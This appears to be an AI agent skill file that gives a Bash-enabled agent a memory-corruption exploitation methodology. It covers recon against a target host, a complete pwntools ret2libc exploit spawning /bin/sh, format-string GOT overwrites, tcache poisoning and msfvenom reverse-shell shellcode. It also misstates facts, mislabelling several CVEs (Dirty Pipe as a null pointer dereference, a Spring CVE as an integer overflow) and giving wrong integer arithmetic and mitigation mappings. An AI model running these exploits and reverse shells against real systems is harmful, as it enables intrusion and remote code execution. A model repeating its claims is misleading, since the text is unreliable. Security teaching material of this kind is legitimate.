---
name: memory-corruption-deep-dive
description: Complete Memory Corruption methodology - buffer overflows, UAF, null pointer dereference, heap/stack overflow, format string, type confusion, integer overflow
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - memory corruption methodology
  - memory corruption deep dive
  - buffer overflow
  - use after free
  - heap overflow
  - stack overflow
  - null pointer dereference
  - format string attack
  - type confusion
  - integer overflow
  - binary exploitation
  - skills memory corruption
---

# Complete Memory Corruption Methodology — Binary Exploitation & Memory Safety

## Step 1: Identify Memory Corruption Attack Surface

### Classes of Memory Corruption
| Class | Description | CVE Examples |
|-------|-------------|-------------|
| Buffer Overflow | Writing data beyond buffer bounds | CVE-2014-0160 (Heartbleed) |
| Heap Overflow | Overflow on heap-allocated memory | CVE-2021-3156 (Baron Samedit) |
| Stack Overflow | Overflow on stack-allocated memory | Classic NX/ASLR bypass chains |
| Use-After-Free (UAF) | Accessing freed heap memory | CVE-2019-11707 (Firefox) |
| Double Free | Freeing already freed memory | CVE-2021-30563 (Chrome) |
| Null Pointer Dereference | Accessing NULL pointer | CVE-2022-0847 (Dirty Pipe) |
| Format String | Uncontrolled format string | Classic %n write primitive |
| Type Confusion | Accessing object as wrong type | CVE-2021-30517 (Chrome V8) |
| Integer Overflow/Underflow | Arithmetic wrap-around | CVE-2022-22963 (Spring) |
| Off-by-One | Off-by-one buffer boundary | CVE-2016-0728 (Keyring) |

### Attack Surface Recon
```bash
# Find binary/software versions
whatweb https://{target}
curl -sk "https://{target}/" | grep -iE "(version|apache|nginx|php|python|ruby|tomcat|jetty|iis|jboss|weblogic|websphere)"

# Check software version headers
curl -sk -I "https://{target}/" | grep -iE "(x-powered-by|server|x-version|x-application)"

# Identify closed-source components
curl -sk "https://{target}" | grep -iE "(flash|silverlight|java applet|activex|npapi|ppapi)"

# Find native binary endpoints
curl -sk "https://{target}/api/binary" -o /tmp/binary.bin
file /tmp/binary.bin
strings /tmp/binary.bin | grep -iE "(malloc|free|memcpy|strcpy|gets|printf|sprintf|vsprintf|scanf)"

# Check HTTP headers for native backends
curl -sk -v "https://{target}/" 2>&1 | grep -iE "(iis|apache|tomcat|jetty|weblogic|websphere|jboss)"

# Identify file format parsers (image, video, document)
curl -sk -o /tmp/test.png "https://{target}/media/test.png"
identify -verbose /tmp/test.png 2>/dev/null | grep -i "image"
```

### Tools for Memory Corruption Discovery
```bash
# Static analysis
# - BinDiff / Diaphora: Binary diffing for patched vulns
# - IDA Pro / Ghidra: Reverse engineering
# - radare2 / rizin: Open-source RE framework

# Fuzzing
# - AFL++: Coverage-guided fuzzer
# - libFuzzer: In-process fuzzer
# - Honggfuzz: Multi-threaded fuzzer
# - syzkaller: Kernel fuzzer

# Dynamic analysis
# - AddressSanitizer (ASan): Memory error detector
# - Valgrind: Memory debugging
# - GDB / WinDbg: Debugging
# - Immunity Debugger: Windows binary exploitation
```

## Step 2: Classic Buffer Overflow

### Stack-Based Buffer Overflow
```bash
# Vulnerable C pattern
# char buf[64];
# gets(buf);               // No bounds check
# strcpy(buf, user_input); // No bounds check
# sprintf(buf, user_input); // Format string + overflow
# scanf("%s", buf);        // No bounds check

# Trigger overflow
python3 -c "print('A' * 100)" | ./vuln_binary

# Pattern generation for offset calculation
# MSF pattern create
msf-pattern_create -l 2000

# Or use cyclic from pwntools
python3 -c "from pwn import *; print(cyclic(2000))"

# Find EIP/RIP offset
# Run with gdb to find the offset that overwrites return address
(gdb) run < <(python3 -c "print('A' * 200)")
(gdb) info registers  # Note EIP value
# msf-pattern_offset -q <EIP_VALUE>
```

### Windows Buffer Overflow Exploitation
```bash
# Tools: WinDbg, Immunity Debugger + mona.py, x64dbg

# Mona configuration
!mona config -set workingfolder c:\logs\%p

# Find modules without protections (DEP, ASLR)
!mona modules
# Look for: Rebase=False, SafeSEH=False, ASLR=False, NXCompat=False

# Find JMP ESP gadget
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# Bad character detection
!mona bytearray -b "\x00\x0a\x0d"
# Compare with actual
!mona compare -f c:\logs\<binary>\bytearray.bin -a <ESP_ADDRESS>

# Generate shellcode with bad chars
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 \
  -b "\x00\x0a\x0d" -f python -v shellcode
```

### Linux Stack Overflows
```bash
# Check security measures
checksec --file=./vuln_binary
# Output: RELRO, Stack Canary, NX, PIE

# Find ROP gadgets
# One_gadget for libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Returns offsets for execve("/bin/sh", NULL, NULL)

# ROPgadget for comprehensive search
ROPgadget --binary ./vuln_binary | grep "pop rdi"

# ROP chain construction with pwntools
python3 << 'EOF'
from pwn import *

elf = ELF('./vuln_binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find ROP gadgets
pop_rdi = 0x401223  # pop rdi; ret
ret = 0x40101a      # ret (for stack alignment)

# Build chain: leak libc → return to main → call system("/bin/sh")
payload = b'A' * 120  # offset to return address
payload += p64(ret)    # stack alignment
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])  # leak puts@got
payload += p64(elf.plt['puts'])  # call puts
payload += p64(elf.symbols['main'])  # return to main

print(payload)
EOF
```

### Heap Overflow
```bash
# Heap overflow occurs when data written exceeds malloc'd buffer
# Can corrupt adjacent heap metadata or other allocations

# Heap exploitation techniques:
# - Heap overflow → tcache poisoning (glibc 2.26+)
# - Heap overflow → fastbin attack
# - Heap overflow → unsafe unlink
# - Heap overflow → House of Force
# - Heap overflow → House of Spirit
# - Heap overflow → arbitrary write

# Common heap overflow targets:
# - Unsafe unlink: overwrite fd/bk pointers in free chunk
# - tcache poisoning: overwrite tcache next pointer
# - fastbin dup: double free via fastbin

# Trigger heap overflow
python3 -c "print('A' * 200)" | ./heap_vuln

# Inspect heap state
(gdb) info proc mappings
(gdb) break *0x400xxx
(gdb) run <<< $(python3 -c "print('A' * 200)")
(gdb) x/100gx main_arena  # Examine heap state
```

### Off-by-One Overflow
```bash
# Null byte overflow (off-by-one null)
# char buf[64];
# read(0, buf, 64);  // Reads 64 bytes into 64-byte buffer
# buf[64] = '\0';    // Off-by-one: writes null past buffer

# The null byte can corrupt adjacent LSB of size field in heap chunk
# This enables overlapping chunks technique

# Exploit steps:
# 1. Allocate three chunks: A, B, C
# 2. Off-by-one null overwrites LSB of B's size
# 3. Free B (which now thinks it's smaller)
# 4. Allocate new chunk overlapping C
# 5. Modify C's metadata / data
```

### Real Buffer Overflow Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #115000 | Steam | Client buffer overflow | (1287 upvotes) |
| #491473 | Yahoo! | memcached buffer overflow | $15,000 |
| #198524 | Slack | Desktop app RCE via overflow | $3,500 |

## Step 3: Use-After-Free (UAF)

### UAF Vulnerability Pattern
```bash
# Vulnerable pattern:
# obj = malloc(sizeof(Object));
# use(obj);
# free(obj);
# ...
# use(obj);  // UAF: accessing freed memory

# If freed memory is reallocated with attacker-controlled data,
# the pointer can be hijacked

# Common UAF locations:
# - DOM element references in browsers
# - C++ virtual table pointers (vtable spray)
# - Timer/callback cleanup races
# - Worker thread synchronization
```

### UAF Exploitation
```bash
# Step 1: Trigger allocation
obj = malloc(0x100);  # Allocate size 0x100

# Step 2: Use and free
use(obj);
free(obj);  # Object freed, pointer not zeroed

# Step 3: Reclaim the freed memory
attacker_control = malloc(0x100);  # Reuses same memory as obj
strcpy(attacker_control, "FAKE_VTBL\x00\x00\x00\x00\x00\x00\x00\x00\x00shellcode...");

# Step 4: Trigger virtual function call on old pointer
# obj->vtable->func() now calls into attacker-controlled data

# Browser UAF typical chain:
# UAF → type confusion → arbitrary R/W → RCE

# C++ vtable hijacking
# struct Object {
#   void (*func1)();
#   void (*func2)();
#   int data;
# };
# After spray: Object->func1() executes attacker's function
```

### Windows/Linux UAF Tools
```bash
# Windows: PageHeap (gflags) for UAF detection
gflags /p /enable vulnerable.exe /full

# Linux: ASAN for detection
gcc -fsanitize=address -g vuln.c -o vuln
./vuln  # ASAN will report UAF with stack trace

# Valgrind
valgrind --tool=memcheck ./vuln_binary
```

## Step 4: Format String Attacks

### Format String Basics
```bash
# Vulnerable pattern:
# printf(user_input);        // Wrong: user input as format string
# printf("%s", user_input);  // Correct: user input as argument

# Format specifiers:
# %x - read hex from stack
# %s - read string pointer from stack
# %n - write number of chars to pointer on stack
# %hn - write 2 bytes
# %hhn - write 1 byte

# Read stack values
printf("AAAA%x.%x.%x.%x.%x.%x")

# Read with direct parameter access (POSIX)
printf("AAAA%6$x")  # Read 6th argument

# Exploitation goal: use %n to write to GOT entry
# %n writes number of characters printed so far
```

### Format String Exploitation
```bash
# Step 1: Find offset of your input on stack
# Send: AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
# Count which position shows 0x41414141 (AAAA)

# Step 2: Read arbitrary memory
# Leak libc address from GOT
printf("\x00\x00\x00\x00%7$s")  # Read string at address on stack

# Step 3: Write to GOT entry
# Write shellcode address to GOT entry of exit() or free()
# Using multiple %hn writes for precision

# Example: overwrite GOT entry with system()
python3 << 'EOF'
from pwn import *

elf = ELF('./vuln_binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Addresses
got_exit = elf.got['exit']
system_plt = elf.plt['system']
binsh = next(libc.search(b'/bin/sh'))

# Format string payload construction
# Split target address into 2-byte chunks for %hn
payload = b''
# Write lower 2 bytes
payload += fmtstr_payload(6, {got_exit: system_plt}, write_size='short')
print(payload)
EOF

# Format string payload generation
# pwntools fmtstr_payload(offset, {got_address: target_value})
```

### Format String Mitigation Bypass
```bash
# FORTIFY_SOURCE detection
# This adds __printf_chk which crashes on %n
# Bypass: Use only %x/%s for read primitives, find ROP chain for write

# RELRO (Relocation Read-Only)
# Partial RELRO: GOT writable (can overwrite)
# Full RELRO: GOT read-only (need other targets - .fini_array, .bss, etc.)
```

## Step 5: Type Confusion

### Type Confusion Basics
```bash
# Vulnerable pattern:
# void *ptr = get_object();
# // Type check missing or incorrect
# ObjectA *obj = (ObjectA *)ptr;  // Wrong: ptr might be ObjectB
# obj->field = attacker_value;     // Overwrites wrong memory

# Common in:
# - JavaScript engines (JIT compiler bugs)
# - Language interpreters
# - Object storage in memory-unsafe languages

# Browser exploitation chain:
# Type confusion → get arbitrary read/write → sandbox escape → RCE
```

### Type Confusion Exploitation
```bash
# JavaScript type confusion
# Typical pattern:
var obj = {a: 0x1234, b: 0x5678};
// Compiler optimizes assuming obj is always this shape
// If attacker can change obj's shape, confusion occurs

// V8 exploitation typical chain:
// 1. Create object with predictable layout
// 2. Trigger type confusion via JIT bug
// 3. Confused object allows read/write outside normal bounds
// 4. Leak Wasm RWX page address
// 5. Write shellcode to Wasm page
// 6. Execute shellcode

# Java type confusion
# List<Cat> cats = new ArrayList<Cat>();
# cats.add(new Cat());
# Object obj = cats.get(0);  // Type erasure
# Dog dog = (Dog) obj;       // ClassCastException at runtime
```

### Real Type Confusion Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #880085 | LINE | V8 type confusion | $10,000 |
| Multiple | Chrome | V8 TurboFan bugs | $15,000 - $30,000 |
| Multiple | Firefox | IonMonkey bugs | $5,000 - $15,000 |

## Step 6: Integer Overflow/Underflow

### Integer Overflow Patterns
```bash
# Unsigned integer overflow
# size_t size = user_controlled;
# char *buf = malloc(size + 1);  // If size = MAXSIZE, size+1 wraps to 0
# read(fd, buf, user_len);       // Heap overflow on small buffer

# Signed integer overflow (undefined behavior)
# int offset = user_input;  // INT_MAX + 1 = -INT_MIN
# char *ptr = base + offset;  // Can wrap around memory

# Integer truncation
# long long large = 0x100000001;
# int small = (int)large;  // Truncated to 1

# Integer underflow
# int len = user_controlled;
# if (len > 0) {           // Bypass: len = -1 passes check
#     foo = malloc(len + 1); // Underflow: -1 + 1 = 0
# }
```

### Integer Overflow Exploitation
```bash
# Classic integer overflow → heap overflow
# Target: size calculation
python3 << 'EOF'
# If size = len + sizeof(header) overflows
# len = 0xFFFFFFF0
# sizeof(header) = 0x20
# size = 0x100000010 → wraps to 0x10
# malloc(0x10) returns small buffer
# Then len bytes copied → heap overflow
EOF

# Integer overflow in array indexing
# array[index] where index = negative value
# Can read/write before array in memory

# Integer overflow in loop bounds
# for (int i = 0; i < user_count; i++) { ... }
# If user_count is negative, loop may never execute
# or if it wraps, may execute too many times
```

## Step 7: Windows/Linux Binary Exploitation Basics

### Security Mitigations Overview
| Mitigation | Linux | Windows | Effect |
|------------|-------|---------|--------|
| NX/DEP | `-z noexecstack` | /NXCOMPAT | Non-executable stack/heap |
| ASLR | `/proc/sys/kernel/randomize_va_space` | /DYNAMICBASE | Randomizes addresses |
| Stack Canary | `-fstack-protector` | /GS | Stack overflow detection |
| RELRO | `-z relro` | /GUARD:CF | GOT read-only |
| PIE | `-fpie -pie` | /HIGHENTROPYVA | Position-independent code |
| CFG | N/A | /GUARD:CF | Control flow guard |
| CET | Shadow Stack | Hardware DEP | Return address protection |

### Linux Exploitation Steps
```bash
# 1. Check protections
checksec --file=./vuln

# 2. Find offset to return address
python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt
gdb -batch -ex "run < pattern.txt" -ex "info registers" ./vuln 2>/dev/null
# EIP = pattern value
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"  # Offset

# 3. Leak addresses (if ASLR)
# Leak puts@got → calculate libc base

# 4. Find ROP gadgets
ROPgadget --binary ./vuln | grep "pop rdi"
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 5. Build ROP chain
# Leak libc → compute system() and /bin/sh → ret2libc

# 6. Full exploit (pwntools)
python3 << 'EOF'
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')

# Leak libc
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Call system("/bin/sh")
payload = b'A' * offset
payload += p64(ret)  # Stack alignment
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)
p.interactive()
EOF
```

### Windows Exploitation Steps
```bash
# 1. Fuzz for crash with pattern payload
python3 -c "print('A' * 5000)" | nc target 9999

# 2. Attach to process with Immunity Debugger
# Find offset with mona pattern

# 3. Check modules for protections
!mona modules

# 4. Find JMP ESP (or other gadget)
!mona jmp -r esp -cpb "\x00"

# 5. Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 \
  -b "\x00\x0a\x0d" -f python -v shellcode

# 6. Build exploit
# [JUNK + OFFSET] + [JMP ESP] + [NOP_SLED] + [SHELLCODE]

# SEH (Structured Exception Handler) overflow
# If can't overwrite EIP directly, overwrite SEH chain
!mona seh
```

## Step 8: Double Free & Null Pointer Dereference

### Double Free
```bash
# Double free pattern:
# p = malloc(size);
# free(p);
# free(p);  // Double free: heap corruption

# Effects:
# - Tcache poisoning (glibc 2.26+)
# - Fastbin double-free (glibc < 2.26)
# - Arbitrary memory write via heap

# tcache poisoning (modern glibc)
# Step 1: malloc(0x10) -> A
# Step 2: free(A)  -> tcache[0x20]: A
# Step 3: free(A)  -> tcache[0x20]: A -> A (if tcache double-free check bypassed)
# Step 4: malloc(0x10) -> A (returns same chunk)
# Step 5: Write to A: overwrite next pointer to target address
# Step 6: malloc(0x10) -> now target address returned
# Step 7: Write arbitrary data to chosen address

# Tcache double-free bypass for glibc 2.29+
# tcache has a key field to detect double-free
# Overwrite key before second free to bypass
```

### Null Pointer Dereference
```bash
# Vulnerable pattern:
# char *ptr = malloc(100);
# free(ptr);
# ptr = NULL;    // Might be missed
# ...
# strcpy(ptr, "data");  // NULL pointer dereference → crash

# Exploitation:
# If kernel has mmap_min_addr = 0
# Can mmap() at address 0, then trigger dereference
# Attacker-controlled data at NULL becomes executable

# Modern mitigation:
# mmap_min_addr = 65536 (prevents mapping near 0)
# But some embedded systems still vulnerable

# Windows: NULL page can be allocated at address 0
# (especially in older versions and some drivers)
```

## Step 9: Fuzzing for Memory Corruption

### Coverage-Guided Fuzzing with AFL++
```bash
# Install AFL++
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus && make

# Compile target with AFL instrumentation
afl-gcc -o vuln_fuzzed vuln.c

# Run fuzzer
afl-fuzz -i input_corpus -o findings ./vuln_fuzzed @@

# Minimize crash cases
afl-tmin -i crash_case -o minimized_crash ./vuln_fuzzed @@

# Triaging crashes
# Each crash in findings/crashes/
for crash in findings/crashes/*; do
  echo "=== Crash: $crash ==="
  ./vuln_fuzzed < "$crash" 2>&1
  gdb -batch -ex "run < $crash" -ex "bt" ./vuln_fuzzed 2>/dev/null
done
```

### LibFuzzer
```bash
# Compile with libFuzzer
clang -fsanitize=address,fuzzer -o vuln_fuzz vuln.c

# Run fuzzer
./vuln_fuzz -max_len=1000 -timeout=5 corpus/

# Check for sanitizer output on crash
```

## Step 10: Validate & Report

### CVSS Scoring for Memory Corruption
```
Stack overflow → RCE:                  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
UAF → RCE:                             AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Heap overflow → RCE:                   AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Format string → info leak:             AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
Null pointer dereference → DoS:        AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
Integer overflow → privilege esc:      AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H → 7.8 High
Double free → denial of service:       AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H → 7.5 High
```

### Report Template
```markdown
**Summary:**
Memory corruption vulnerability ([type]) in [component] allows an attacker to
[achieve RCE / cause denial of service / escalate privileges].

**Impact:**
An attacker can [execute arbitrary code / crash the service / read sensitive memory].

**Steps to Reproduce:**
1. [Detailed trigger steps]
2. Send payload: [payload description]
3. Observe: [crash, memory corruption, code execution]

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)

**Suggested Fix:**
1. Use bounds-checked functions (strncpy vs strcpy, snprintf vs sprintf)
2. Enable compiler mitigations (stack canary, ASLR, PIE, NX, RELRO)
3. Use memory-safe languages (Rust, Go) for new code
4. Use AddressSanitizer during development/testing
5. Apply principle of least privilege
```

## Memory Corruption Automation Script
```bash
#!/bin/bash
# Basic binary security checker and fuzzer setup
BINARY=$1

echo "[*] Analyzing $BINARY"

# Check binary protections
if command -v checksec &>/dev/null; then
  checksec --file="$BINARY"
else
  readelf -l "$BINARY" 2>/dev/null | grep -E "(GNU_STACK|GNU_RELRO)"
  echo "NX: $(readelf -l "$BINARY" 2>/dev/null | grep -q 'STACK.*E' && echo 'Disabled' || echo 'Enabled')"
fi

# Check for dangerous functions
echo "[*] Checking for dangerous functions..."
strings "$BINARY" | grep -iE "(gets|strcpy|strcat|sprintf|vsprintf|scanf|sscanf)" | sort -u

# Generate cyclic pattern and test crash offset
echo "[*] Generating pattern for offset detection..."
python3 -c "from pwn import *; print(cyclic(2000))" > /tmp/test_pattern.txt

echo "[*] To find offset: gdb -batch -ex 'run < /tmp/test_pattern.txt' -ex 'info registers' $BINARY"
echo "[*] Analysis complete"
```

## Quick Reference: Top Memory Corruption Reports by Payout
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #115000 | Steam | Client buffer overflow | (1287 upvotes) |
| #491473 | Yahoo! | memcached buffer overflow | $15,000 |
| #880085 | LINE | V8 type confusion | $10,000 |
| #198524 | Slack | Desktop RCE via overflow | $3,500 |
| Multiple | Google Chrome | V8 multiple bugs | $15,000 - $30,000 |

(End of file - total 570 lines)
